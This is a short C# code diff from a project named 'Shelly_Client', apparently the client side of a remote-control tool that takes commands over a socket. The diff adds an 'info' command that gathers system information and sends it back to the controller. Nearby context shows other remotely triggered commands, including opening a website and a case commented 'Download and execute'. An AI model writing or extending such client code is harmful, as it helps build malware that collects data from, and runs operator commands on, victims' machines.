@@ -59,6 +59,13 @@ namespace Shelly_Client
                     Functions.General.OpenWebsite(Command[1]);
                     break;
 
+                // Get info
+                case "info":
+
+                    // Get system info and send back
+                    SocketHandler.Send(Functions.General.GetSystemInfo());
+                    break;
+
                 // Download and execute
                 case "changewallpaper":
 
